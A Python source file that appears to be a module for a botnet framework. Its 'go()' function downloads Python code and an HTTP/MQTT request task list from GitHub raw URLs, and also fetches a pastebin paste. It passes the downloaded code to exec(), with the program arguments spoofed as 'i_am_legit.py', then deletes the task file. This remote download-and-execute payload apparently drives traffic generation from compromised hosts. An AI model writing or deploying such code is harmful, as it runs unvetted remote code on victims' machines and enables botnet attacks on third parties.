import requests
import threading
import time as t
from queue import Queue
import json   
import argparse
#linijka 1337  dodac import zdalne payloads.py
import threading
#import time
import util
# globals
command = True #???
#packages = ['util']
platforms = ['win32','linux2','darwin']
usage = 'test'
description = """
test test test test test
"""
#util.log('HELLO FROM TEST LOG')
#print('TEST PRINT')
def go():
    try:
        try:
            import sys,urllib,os
            if sys.version_info[0] > 2:
                from urllib import request
        except Exception as e:
            util.log(e)
        print('TEST PRINT2')
        
        util.log('HELLO FROM TEST LOG2')
        urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen

        http_generator=urlopen('https://raw.githubusercontent.com/xbubus/byobnest/master/test2').read().decode('utf-8')#.replace('print','util.log')
        pure_tasks=urlopen('https://raw.githubusercontent.com/xbubus/http-mqtt-requests-generator-sender/master/http_out.json').read().decode('utf-8')
        with open ('tasks','w')as f:
            f.write(pure_tasks)
        with open ('githubed.py','w')as f:
            f.write(http_generator)
        sys.argv=['i_am_legit.py','-itasks','-t10']
        print(sys.argv)
        simple=urlopen('https://pastebin.pl/view/raw/f1f32b7f').read().decode('utf-8')
        #print(simple)
        executable="import util \nutil.log('hihihihihi')"
        #print(executable)
        # http_generator_splitted=http_generator.split('\n')
        # for a in http_generator_splitted:
        #     if 'import' in a:
        #         try:
        #             util.log('executing: {}'.format(a))
        #             #exec(a)
        #             importlib.import_module(a.split('import ')[1])
        #         except Exception as e:
        #             util.log("filed to execute.. {}".format(e))
        # __import__('json')
        #print(json.dumps({'4': 5, '6': 7}))            
        exec(http_generator)
        #time.sleep(60)
        os.remove('tasks')
    except Exception as e:
        util.log('go error')
        util.log('{}'.format(e))
def run():
    try:
        # thread = threading.Thread(name='testing', target=run)
        # thread.setDaemon(True)
        # thread.start()
        go()
        return 'TEST PRINT RETURN ok'
    except Exception as e:
        util.log('run error')
        util.log('{}'.format(e))
        return e